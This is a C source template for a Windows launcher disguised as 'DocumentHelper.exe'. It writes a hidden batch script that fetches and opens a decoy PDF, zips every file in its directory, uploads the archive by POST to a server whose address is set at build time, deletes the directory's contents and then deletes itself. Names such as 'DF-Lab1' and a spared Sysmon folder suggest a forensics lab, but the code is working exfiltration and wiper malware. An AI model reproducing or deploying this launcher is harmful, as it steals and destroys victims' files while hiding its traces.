// launcher_template.c
// Windows launcher: writes an embedded .bat to %TEMP%, runs it hidden,
// then deletes the temp file. @IP@ is substituted by Flask at build time.
#include <windows.h>
#include <stdio.h>
#include <string.h>

static const char BAT_BODY[] =
"powershell -NoProfile -Command \"Invoke-WebRequest -Uri 'http://%SERVER_IP%/download/DF-Lab1.pdf' -OutFile '%EXE_DIR%\\DF-Lab1.pdf' -UseBasicParsing\"\r\n"
"powershell -NoProfile -Command \"Start-Process -FilePath '%EXE_DIR%\\DF-Lab1.pdf'\"\r\n"
"powershell -NoProfile -Command \"Start-Sleep -Seconds 15\"\r\n"
"powershell -NoProfile -Command \"& { $ex = @('$RECYCLE.BIN','System Volume Information','phoenix_staging.zip','%EXE_NAME%'); Get-ChildItem -Force -LiteralPath '%EXE_DIR%' | Where-Object { $_.Name -notin $ex } | Compress-Archive -DestinationPath '%EXE_DIR%\\phoenix_staging.zip' -Force }\"\r\n"
"powershell -NoProfile -Command \"Invoke-WebRequest -Uri 'http://%SERVER_IP%/uploaded/phoenix_staging.zip' -Method POST -InFile '%EXE_DIR%\\phoenix_staging.zip' -ContentType 'application/octet-stream' -UseBasicParsing\"\r\n"
"powershell -NoProfile -Command \"Get-ChildItem -Force -LiteralPath '%EXE_DIR%' | Where-Object { $_.Name -notin 'Sysmon','System Volume Information','$RECYCLE.BIN','%EXE_NAME%' } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue\"\r\n"
"start \"\" /b powershell -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 3; Remove-Item -LiteralPath '%EXE_DIR%\\%EXE_NAME%' -Force -ErrorAction SilentlyContinue\"\r\n"
"endlocal\r\n";

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR cmd, int show) {
    char exeFullPath[MAX_PATH];
    char exeDir[MAX_PATH];
    char exeName[MAX_PATH];

    strncpy(exeDir, "%CD%", sizeof(exeDir));
    strncpy(exeName, "DocumentHelper.exe", sizeof(exeName));

    if (GetModuleFileNameA(NULL, exeFullPath, MAX_PATH) > 0) {
        char *lastSlash = strrchr(exeFullPath, '\\');
        if (lastSlash) {
            strncpy(exeName, lastSlash + 1, sizeof(exeName) - 1);
            exeName[sizeof(exeName) - 1] = '\0';
            *lastSlash = '\0';
            strncpy(exeDir, exeFullPath, sizeof(exeDir) - 1);
            exeDir[sizeof(exeDir) - 1] = '\0';
        } else {
            strncpy(exeName, exeFullPath, sizeof(exeName) - 1);
            exeName[sizeof(exeName) - 1] = '\0';
        }
    }

    char tmp[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tmp) == 0) return 1;

    char batpath[MAX_PATH + 64];
    snprintf(batpath, sizeof(batpath), "%sphx_%lu.bat", tmp, GetCurrentProcessId());

    FILE *f = fopen(batpath, "wb");
    if (!f) return 1;

    fprintf(f,
        "@echo off\r\n"
        "setlocal EnableExtensions\r\n"
        "set \"EXE_NAME=%s\"\r\n"
        "set \"EXE_DIR=%s\"\r\n"
        "set \"SERVER_IP=@IP@\"\r\n",
        exeName, exeDir
    );
    fwrite(BAT_BODY, 1, sizeof(BAT_BODY) - 1, f);
    fclose(f);

    char cmdline[sizeof(batpath) + 32];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\"", batpath);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    DeleteFileA(batpath);
    return 0;
}
